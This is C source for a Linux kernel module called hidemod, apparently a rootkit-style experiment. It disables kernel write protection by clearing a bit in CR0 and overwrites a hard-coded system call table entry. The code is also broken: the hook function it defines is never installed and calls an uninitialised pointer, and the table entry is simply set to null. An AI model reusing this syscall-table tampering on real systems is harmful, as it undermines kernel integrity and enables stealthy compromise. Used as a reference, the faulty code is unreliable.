#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/list.h>

MODULE_LICENSE("GPL");
static void (*p)(void);

asmlinkage long hook_337_syscall(void)
{
	/* I will change code */
	printk(KERN_ALERT "wait changing");
	p();
	return 0;
}

static inline unsigned int setcr0(void)
{
	unsigned int cr0, ret;
	asm volatile ("movl %%cr0, %%eax":"=a"(ret):);
	cr0 = ret & 0xfffeffff;
	asm volatile ("movl %%eax, %%cr0"::"a"(cr0));
	printk(KERN_ALERT "setcr0\n");
	return ret;
}

static inline void setbackcr0(unsigned int cr0)
{
	asm volatile ("movl %%eax, %%cr0"::"a"(cr0));
}

static int __init hidemod_init(void)
{
	unsigned long **sys_call_table;
	unsigned int cr0;
	sys_call_table = (unsigned long **)0xc0798328;	

	cr0 = setcr0();
	sys_call_table[337] = (unsigned long *)0x0;
	setbackcr0(cr0);

	return 0;
}

static void __exit hidemod_exit(void)
{
	/* 
	 * I do not free the page :P
	 * Just a *deliberate* memory leak!
	 */
}

module_init(hidemod_init);
module_exit(hidemod_exit);
